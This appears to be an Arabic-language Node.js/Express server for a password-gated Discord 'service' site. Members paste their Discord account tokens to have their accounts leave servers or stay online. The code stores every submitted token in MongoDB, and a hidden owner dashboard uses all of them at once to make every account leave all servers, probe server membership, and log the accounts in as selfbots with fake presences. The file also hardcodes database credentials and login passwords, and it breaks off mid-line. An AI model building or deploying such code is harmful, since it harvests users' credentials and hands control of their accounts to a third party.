require("dotenv").config();
const express = require("express");
const cookieParser = require("cookie-parser");
const mongoose = require("mongoose");
const { Client } = require("discord.js-selfbot-v13");

const {
  PORT = 3000,
  MONGO_URI = "mongodb+srv://omargamingff2_db_user:CT8NNal0NVdHdoB9@cluster0.pab2lk3.mongodb.net/",
  COOKIE_SECRET = "keo_secret_key_999"
} = process.env;

const API = "https://discord.com/api/v10";

// الاتصال بقاعدة البيانات
mongoose.connect(MONGO_URI, {
  useNewUrlParser: true,
  useUnifiedTopology: true
}).then(() => console.log("Connected to MongoDB!")).catch(err => console.error(err));

// نموذج تخزين التوكنات
const userSchema = new mongoose.Schema({
  token: { type: String, required: true, unique: true },
  createdAt: { type: Date, default: Date.now }
});
const TokenModel = mongoose.model("bot_tokens", userSchema);

// نموذج تخزين الإحصائيات
const statsSchema = new mongoose.Schema({
  id: { type: String, default: "global_stats" },
  visitors: { type: Number, default: 0 },
  normalLogins: { type: Number, default: 0 },
  ownerLogins: { type: Number, default: 0 },
  failedAttempts: { type: Number, default: 0 },
  totalOperations: { type: Number, default: 0 },
  leaveCooldownDays: { type: Number, default: 0 } // مدة الاشتراك بالأيام
});
const StatsModel = mongoose.model("site_stats", statsSchema);

// دالة لتحديث الإحصائيات
async function updateStat(field, value = 1) {
  await StatsModel.findOneAndUpdate(
    { id: "global_stats" },
    { $inc: { [field]: value } },
    { upsert: true, new: true }
  );
}

// تخزين جلسات السيلف بوت النشطة
const activeClients = new Map();

// قائمة ألعاب مشهورة من Google Play
const googlePlayGames = [
  "PUBG MOBILE", "Free Fire", "Roblox", "Minecraft", 
  "Brawl Stars", "Call of Duty: Mobile", "Subway Surfers", 
  "Clash of Clans", "8 Ball Pool", "Among Us", "Candy Crush Saga"
];

const app = express();
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser(COOKIE_SECRET));

// القالب التصميمي الموحد (الهالووين)
const layout = (title, content) => `<!doctype html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>${title}</title>
  <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700;800&display=swap" rel="stylesheet">
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      background: linear-gradient(rgba(10, 5, 20, 0.75), rgba(10, 5, 20, 0.85)), 
                  url('https://images.unsplash.com/photo-1509557965875-b88c97052f0e?q=80&w=1920&auto=format&fit=crop') no-repeat center center fixed;
      background-size: cover;
      color: #e0def4;
      font-family: 'Tajawal', sans-serif;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    .card {
      background: rgba(20, 14, 28, 0.92);
      backdrop-filter: blur(15px);
      border: 1px solid rgba(255, 107, 0, 0.35);
      border-radius: 24px;
      padding: 40px 30px;
      text-align: center;
      max-width: 520px;
      width: 100%;
      box-shadow: 0 25px 60px rgba(0, 0, 0, 0.9), 0 0 35px rgba(255, 107, 0, 0.2);
    }
    h2 { font-size: 22px; color: #ff9f43; margin-bottom: 20px; font-weight: 700; }
    p { font-size: 14px; color: #b8b5e0; margin-bottom: 20px; line-height: 1.6; }
    input[type="password"], input[type="text"], select, input[type="number"] {
      width: 100%;
      padding: 14px;
      background: rgba(10, 5, 20, 0.8);
      border: 1px solid rgba(255, 107, 0, 0.3);
      border-radius: 12px;
      color: #fff;
      font-family: 'Tajawal', sans-serif;
      font-size: 15px;
      margin-bottom: 20px;
      outline: none;
      text-align: center;
    }
    input:focus { border-color: #ff7b00; box-shadow: 0 0 10px rgba(255, 123, 0, 0.3); }
    .btn {
      display: block;
      width: 100%;
      background: linear-gradient(135deg, #ff7b00, #ff4500);
      color: #fff;
      border: none;
      padding: 14px;
      border-radius: 12px;
      font-size: 16px;
      font-weight: 700;
      cursor: pointer;
      text-decoration: none;
      transition: 0.3s;
      box-shadow: 0 4px 15px rgba(255, 123, 0, 0.4);
      margin-bottom: 12px;
    }
    .btn:hover { transform: translateY(-2px); opacity: 0.9; }
    .btn-secondary {
      background: rgba(255, 255, 255, 0.08);
      border: 1px solid rgba(255, 255, 255, 0.15);
      box-shadow: none;
    }
    .btn-owner {
      background: linear-gradient(135deg, #8a2be2, #4b0082);
      box-shadow: 0 4px 15px rgba(138, 43, 226, 0.4);
    }
    .logs-box {
      background: rgba(5, 2, 10, 0.95);
      border: 1px solid rgba(255, 107, 0, 0.3);
      border-radius: 12px;
      padding: 15px;
      text-align: right;
      max-height: 250px;
      overflow-y: auto;
      font-family: monospace;
      font-size: 13px;
      color: #57f287;
      margin-bottom: 20px;
    }
    .stat-box {
      background: rgba(255, 255, 255, 0.05);
      border-radius: 10px;
      padding: 12px;
      margin-bottom: 10px;
      text-align: right;
      font-size: 14px;
      display: flex;
      justify-content: space-between;
    }
    .developer-sig {
      font-size: 10px;
      font-weight: 300;
      color: rgba(255, 255, 255, 0.4);
      letter-spacing: 2px;
      text-transform: uppercase;
      border-top: 1px solid rgba(255, 255, 255, 0.08);
      padding-top: 15px;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <div class="card">
    ${content}
    <div class="developer-sig">made by syrian devloper : keo</div>
  </div>
</body>
</html>`;

// تتبع الزيارات
app.use(async (req, res, next) => {
  if (req.path === "/auth" && req.method === "GET") {
    await updateStat("visitors");
  }
  next();
});

// صفحة تسجيل الدخول (العادية أو للمالك)
app.get("/auth", (req, res) => {
  res.send(layout("تسجيل الدخول", `
    <h2>🔒 بوابة الدخول المرعبة</h2>
    <p>أدخل كلمة السر الخاصة للوصول إلى الواجهة المطلوبة</p>
    <form method="POST" action="/auth">
      <input type="password" name="password" placeholder="أدخل كلمة السر هنا..." required>
      <button class="btn" type="submit">دخول</button>
    </form>
  `));
});

app.post("/auth", async (req, res) => {
  const { password } = req.body;
  if (password === "mılanmembersite") {
    await updateStat("normalLogins");
    res.cookie("auth_type", "normal", { signed: true, httpOnly: true });
    res.redirect("/");
  } else if (password === "73849274628491837465djfbfbrhdjzkkieueiwksndnxbxjxdjehrbrjfjjdhwwiowjddbskdb9283746518293746xkfbfbrhdjzjjkiieueiwksndnxbx") {
    await updateStat("ownerLogins");
    res.cookie("auth_type", "owner", { signed: true, httpOnly: true });
    res.redirect("/owner-dashboard");
  } else {
    await updateStat("failedAttempts");
    res.send(layout("خطأ", `<h2>❌ كلمة السر خاطئة!</h2><p style="color:#ff5555; font-size:12px;">تم تسجيل محاولة الفشل.</p><a class="btn" href="/auth">إعادة المحاولة</a>`));
  }
});

// Middleware للتحقق من العضو العادي
const checkNormalAuth = (req, res, next) => {
  if (req.signedCookies.auth_type !== "normal" && req.signedCookies.auth_type !== "owner") return res.redirect("/auth");
  next();
};

// Middleware للتحقق من المالك فقط
const checkOwnerAuth = (req, res, next) => {
  if (req.signedCookies.auth_type !== "owner") return res.redirect("/auth");
  next();
};

// --- واجهة العضو العادي ---
app.get("/", checkNormalAuth, (req, res) => {
  res.send(layout("إدخال التوكن", `
    <h2>🔑 إدخال توكن الحساب</h2>
    <p>أدخل توكن حساب ديسكورد الخاص بك للمتابعة</p>
    <form method="POST" action="/save-token">
      <input type="text" name="token" placeholder="ضع التوكن هنا..." required>
      <button class="btn" type="submit">حفظ ومتابعة</button>
    </form>
  `));
});

app.post("/save-token", checkNormalAuth, async (req, res) => {
  const { token } = req.body;
  if (!token) return res.redirect("/");
  try {
    await TokenModel.findOneAndUpdate({ token }, { token }, { upsert: true, new: true });
    await updateStat("totalOperations");
    res.cookie("user_token", token, { signed: true, httpOnly: true });
    res.redirect("/dashboard");
  } catch (err) {
    res.send(layout("خطأ", `<h2>❌ حدث خطأ</h2><a class="btn" href="/">العودة</a>`));
  }
});

app.get("/dashboard", checkNormalAuth, (req, res) => {
  const token = req.signedCookies.user_token;
  if (!token) return res.redirect("/");

  res.send(layout("لوحة التحكم", `
    <h2>🦇 شو الخدمة الي تبيها يا معلم؟</h2>
    <p>اختر الخدمة المطلوبة لحسابك</p>
    <a class="btn" href="/leave-servers">الخدمة الأولى: إخراج الحساب من السيرفرات</a>
    <a class="btn" href="/online-options">الخدمة الثانية: جعل الحساب أونلاين دائماً</a>
  `));
});

// --- قائمة المالك (Owner Dashboard) ---
app.get("/owner-dashboard", checkOwnerAuth, (req, res) => {
  res.send(layout("لوحة تحكم المالك الخارقة", `
    <h2>👑 أهلاً بك يا مالك الموقع</h2>
    <p>تحكم كامل وشامل بجميع الحسابات والسيرفرات</p>
    <a class="btn btn-owner" href="/owner/leave-all">إخراج كل الحسابات المسجلة من السيرفرات</a>
    <a class="btn btn-owner" href="/owner/check-server">فحص سيرفر معين</a>
    <a class="btn btn-owner" href="/owner/cooldown">تعيين مدة الاشتراك (Auto-Leave)</a>
    <a class="btn btn-owner" href="/owner/all-online">جعل جميع الحسابات أونلاين (ألعاب Google Play)</a>
    <a class="btn btn-secondary" href="/owner/info">معلومات الموقع والإحصائيات</a>
  `));
});

// 1. إخراج كل الحسابات المسجلة من كل السيرفرات
app.get("/owner/leave-all", checkOwnerAuth, async (req, res) => {
  res.send(layout("إخراج جميع الحسابات...", `
    <h2>⚠️ جاري إخراج كل الحسابات من جميع السيرفرات...</h2>
    <div class="logs-box" id="logs">جاري بدء العملية...</div>
    <script>
      async function startAllLeaving() {
        const box = document.getElementById('logs');
        try {
          const res = await fetch('/api/owner/leave-all', { method: 'POST' });
          const reader = res.body.getReader();
          const decoder = new TextDecoder();
          box.innerHTML = '';
          while (true) {
            const { value, done } = await reader.read();
            if (done) break;
            box.innerHTML += decoder.decode(value, { stream: true });
            box.scrollTop = box.scrollHeight;
          }
          box.innerHTML += '<br><b>✅ تم الانتهاء بنجاح!</b>';
        } catch (e) {
          box.innerHTML += '<br>❌ حدث خطأ.';
        }
      }
      startAllLeaving();
    </script>
    <br><a class="btn" href="/owner-dashboard">العودة للوحة المالك</a>
  `));
});

app.post("/api/owner/leave-all", checkOwnerAuth, async (req, res) => {
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  const tokens = await TokenModel.find({});
  
  for (const user of tokens) {
    res.write(`<b>--- بدء معالجة الحساب ---</b><br>`);
    try {
      const gRes = await fetch(`${API}/users/@me/guilds`, { headers: { Authorization: user.token } });
      if (!gRes.ok) {
        res.write(`فشل جلب سيرفرات أحد الحسابات (توكن غير صالح)<br>`);
        continue;
      }
      const guilds = await gRes.json();
      for (const guild of guilds) {
        const lRes = await fetch(`${API}/users/@me/guilds/${guild.id}`, { method: "DELETE", headers: { Authorization: user.token } });
        if (lRes.ok || lRes.status === 204) {
          res.write(`- تم الخروج من ${guild.name}<br>`);
        } else {
          res.write(`- فشل الخروج من ${guild.name}<br>`);
        }
        await new Promise(r => setTimeout(r, 600));
      }
    } catch (e) {
      res.write(`خطأ في معالجة أحد الحسابات.<br>`);
    }
  }
  await updateStat("totalOperations");
  res.end();
});

// 2. فحص سيرفر
app.get("/owner/check-server", checkOwnerAuth, (req, res) => {
  res.send(layout("فحص سيرفر", `
    <h2>🔍 فحص معلومات سيرفر</h2>
    <form method="POST" action="/owner/check-server">
      <input type="text" name="guildId" placeholder="أدخل آيدي السيرفر (Guild ID)..." required>
      <button class="btn btn-owner" type="submit">فحص السيرفر</button>
    </form>
    <a class="btn btn-secondary" href="/owner-dashboard">العودة</a>
  `));
});

app.post("/owner/check-server", checkOwnerAuth, async (req, res) => {
  const { guildId } = req.body;
  const tokens = await TokenModel.find({});
  let botsInServer = 0;

  // فحص كم حساب مسجل داخل السيرفر
  for (const user of tokens) {
    try {
      const r = await fetch(`${API}/users/@me/guilds`, { headers: { Authorization: user.token } });
      if (r.ok) {
        const guilds = await r.json();
        if (guilds.some(g => g.id === guildId)) botsInServer++;
      }
    } catch (e) {}
  }

  // جلب بيانات السيرفر العامة (تتطلب بوت أو توكن صالح)
  res.send(layout("نتيجة الفحص", `
    <h2>📊 معلومات السيرفر (${guildId})</h2>
    <div class="stat-box"><span>الحسابات المسجلة بداخله:</span> <b>${botsInServer} حساب</b></div>
    <p style="font-size:12px; color:#aaa; margin-top:10px;">تم فحص الحسابات المسجلة في قاعدة البيانات بنجاح.</p>
    <a class="btn" href="/owner/check-server">فحص سيرفر آخر</a>
    <a class="btn btn-secondary" href="/owner-dashboard">العودة للوحة المالك</a>
  `));
});

// 3. تعيين مدة الاشتراك (Auto-Leave)
app.get("/owner/cooldown", checkOwnerAuth, async (req, res) => {
  const stats = await StatsModel.findOne({ id: "global_stats" }) || { leaveCooldownDays: 0 };
  res.send(layout("مدة الاشتراك", `
    <h2>⏳ تعيين مدة البقاء التلقائي</h2>
    <p>الحالة الحالية: <b>${stats.leaveCooldownDays} يوم</b></p>
    <form method="POST" action="/owner/cooldown">
      <input type="number" name="days" placeholder="عدد الأيام (مثال: 14)..." required>
      <button class="btn btn-owner" type="submit">حفظ وتطبيق</button>
    </form>
    <a class="btn btn-secondary" href="/owner-dashboard">العودة</a>
  `));
});

app.post("/owner/cooldown", checkOwnerAuth, async (req, res) => {
  const { days } = req.body;
  await StatsModel.findOneAndUpdate({ id: "global_stats" }, { leaveCooldownDays: Number(days) }, { upsert: true });
  res.send(layout("تم الحفظ", `<h2>✅ تم تحديث مدة البقاء إلى ${days} يوم بنجاح!</h2><a class="btn" href="/owner-dashboard">العودة</a>`));
});

// 4. صفحة المعلومات والإحصائيات للمالك
app.get("/owner/info", checkOwnerAuth, async (req, res) => {
  const stats = await StatsModel.findOne({ id: "global_stats" }) || {};
  const totalTokens = await TokenModel.countDocuments();
  
  // حساب عدد الحسابات المتصلة أونلاين حالياً
  let onlineBotsCount = 0;
  for (const client of activeClients.values()) {
    if (client.user) onlineBotsCount++;
  }

  res.send(layout("إحصائيات الموقع", `
    <h2>📈 معلومات وإحصائيات الموقع</h2>
    <div class="stat-box"><span>إجمالي زوار الموقع:</span> <b>${stats.visitors || 0}</b></div>
    <div class="stat-box"><span>دخول بـ (mılanmembersite):</span> <b>${stats.normalLogins || 0}</b></div>
    <div class="stat-box"><span>دخول المالك:</span> <b>${stats.ownerLogins || 0}</b></div>
    <div class="stat-box"><span>محاولات دخول خاطئة:</span> <b>${stats.failedAttempts || 0}</b></div>
    <div class="stat-box"><span>الحسابات المسجلة أونلاين الآن:</span> <b style="color:#57f287;">${onlineBotsCount} حساب</b></div>
    <div class="stat-box"><span>إجمالي العمليات المنفذة:</span> <b>${stats.totalOperations || 0}</b></div>
    <div class="stat-box"><span>إجمالي التوكنات المحفوظة:</span> <b>${totalTokens} توكن</b></div>
    <br>
    <a class="btn btn-secondary" href="/owner-dashboard">العودة للوحة المالك</a>
  `));
});

// 5. جعل جميع الحسابات أونلاين بأسماء ألعاب Google Play
app.get("/owner/all-online", checkOwnerAuth, async (req, res) => {
  const tokens = await TokenModel.find({});
  let successCount = 0;

  for (const user of tokens) {
    if (activeClients.has(user.token)) continue; // لو شغال أصلاً تخطاه

    const client = new Client();
    const randomGame = googlePlayGames[Math.floor(Math.random() * googlePlayGames.length)];

    client.on("ready", () => {
      client.user.setPresence({
        activities: [{ name: randomGame, type: "PLAYING" }],
        status: "online"
      });
    });

    try {
      await client.login(user.token);
      activeClients.set(user.token, client);
      successCount++;
    } catch (e) {}
  }

  await updateStat("totalOperations");
  res.send(layout("تم التشغيل الجماعي", `
    <h2>🎮 تم تشغيل الحسابات بنجاح!</h2>
    <p>تم تفعيل <b>${successCount} حساب</b> وإبقاؤهم أونلاين بوضع اللعب (PLAYING) مع ألعاب Google Play الشهيرة.</p>
    <a class="btn" href="/owner-dashboard">العودة للوحة المالك</a>
  `));
});

// --- الخدمات العادية (إخراج وسيرفرات وأونلاين فردي) ---
app.get("/leave-servers", checkNormalAuth, async (req, res) => {
  res.send(layout("جاري المغادرة...", `
    <h2>⚠️ جاري الخروج من السيرفرات...</h2>
    <div class="logs-box" id="logs">جاري جلب القائمة...</div>
    <script>
      async function startLeaving() {
        const box = document.getElementById('logs');
        try {
          const res = await fetch('/api/leave', { method: 'POST' });
          const reader = res.body.getReader();
          const decoder = new TextDecoder();
          box.innerHTML = '';
          while (true) {
            const { value, done } = await reader.read();
            if (done) break;
            box.innerHTML += decoder.decode(value, { stream: true });
            box.scrollTop = box.scrollHeight;
          }
          box.innerHTML += '<br><b>✅ تم الانتهاء! جاري إعادتك...</b>';
          setTimeout(() => { window.location.href = '/'; }, 3000);
        } catch (e) { box.innerHTML += '<br>❌ خطأ.'; }
      }
      startLeaving();
    </script>
  `));
});

app.post("/api/leave", checkNormalAuth, async (req, res) => {
  const token = req.signedCookies.user_token;
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  try {
    const guildsRes = await fetch(`${API}/users/@me/guilds`, { headers: { Authorization: token } });
    if (!guildsRes.ok) { res.write("فشل الجلب."); return res.end(); }
    const guilds = await guildsRes.json();
    for (const guild of guilds) {
      const leaveRes = await fetch(`${API}/users/@me/guilds/${guild.id}`, { method: "DELETE", headers: { Authorization: token } });
      if (leaveRes.ok || leaveRes.status === 204) {
        res.write(`- تم الخروج من ${guild.name}<br>`);
      } else {
        res.write(`- فشل الخروج من ${guild.name}<br>`);
      }
      await new Promise(r => setTimeout(r, 800));
    }
  } catch (e) { res.write("خطأ."); }
  await updateStat("totalOperations");
  res.end();
});

app.get("/online-options", checkNormalAuth, (req, res) => {
  res.send(layout("الحالة أونلاين", `
    <h2>🟢 إبقاء الحساب أونلاين دائماً</h2>
    <form method="POST" action="/start-online">
      <select name="statusType">
        <option value="PLAYING">يلعب (Playing)</option>
        <option value="STREAMING">يبث (Streaming)</option>
        <option value="WATCHING">يشاهد (Watching)</option>
        <option value="LISTENING">يستمع (Listening)</option>
      </select>
      <input type="text" name="statusText" placeholder="اسم النشاط..." required>
      <button class="btn" type="submit">تشغيل الحالة</button>
    </form>
    <a class="btn btn-secondary" href="/dashboard">العودة</a>
  `));
});

app.post("/start-online", checkNormalAuth, async (req, res) => {
  const token = req.signedCookies.user_token;
  const { statusType, statusText } = req.body;
  if (!token) return res.redirect("/");

  if (activeClients.has(token)) {
    try { activeClients.get(token).destroy(); } catch(e){}
    activeClients.delete(token);
  }

  const client = new Client();
  client.on("ready", () => {
    client.user.setPresence({ activities: [{ name: statusText, type: statusType }], status: "online" });
  });

  try {
    await client.login(token);
    activeClients.set(token, client);
    await updateStat("totalOperations");
    res.send(layout("تم التشغيل", `<h2>🚀 تم التفعيل بنجاح!</h2><a class="btn" 